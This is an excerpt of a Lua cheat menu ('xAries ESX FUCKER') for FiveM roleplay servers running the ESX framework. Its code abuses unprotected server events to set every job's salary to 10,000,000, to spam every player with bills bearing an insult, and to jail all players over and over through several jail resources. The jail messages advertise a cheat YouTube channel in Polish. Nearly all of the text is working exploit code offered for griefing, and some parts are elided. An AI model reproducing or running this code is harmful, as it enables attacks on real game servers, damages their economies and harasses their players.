...
function MINERMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'miner', 0, 10000000)
	end
end
function slaugMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'slaughterer', 0, 10000000)
	end
end
function fishermanMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'fisherman', 0, 10000000)
	end
end
function lumberjackMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'lumberjack', 0, 10000000)
	end
end
function fuelerMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'fueler', 0, 10000000)
	end
end
function reporterMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'reporter', 0, 10000000)
	end
end
function tailorMoney()
	if ESX then
		ESX.TriggerServerCallback('esx_society:setJobSalary', function()
			end, 'tailor', 0, 10000000)
	end
end
...
Menu.CreateMenu('memes', 'xAries addon<3')
...
Menu.CreateSubMenu('esxFucker', 'memes', 'xAries ESX FUCKER')
	...
	while true do
		if Menu.IsMenuOpened('memes') then
			...
			elseif Menu.MenuButton('xAries ESX FUCKER', 'esxFucker') then
		...
		elseif Menu.IsMenuOpened('esxFucker') then
			if Menu.Button('Crasher Bill FCKX') then
				for i=1, 1000 do
					for k, v in pairs(GetPlayers()) do
						TriggerServerEvent("esx_billing:sendBill", GetPlayerServerId(i), "", "xariessss kurwoooooooooo", 999999999)
					end
				end
			end
			
			if Menu.Button('xJail EveryONE (WORK)') then
				for i=0,255 do 
			...
			if Menu.Button('xAries FUCKER :)') then
			    for i=0,3000 do 
			        TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)", 300)
					TriggerServerEvent('01ad59c2-03fb-4452-803a-d7e124728232', GetPlayerServerId(i), 5000)
					TriggerServerEvent('01ad59c2-03fb-4452-803a-d7e124728232', 5000)
					TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "youtube.com/c/aries98 <--- NAJLEPSZE CHEATY NA FIVEMA :)")
					...
					TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000)
					TriggerServerEvent("esx_jail:jail", GetPlayerServerId(i), 5000)
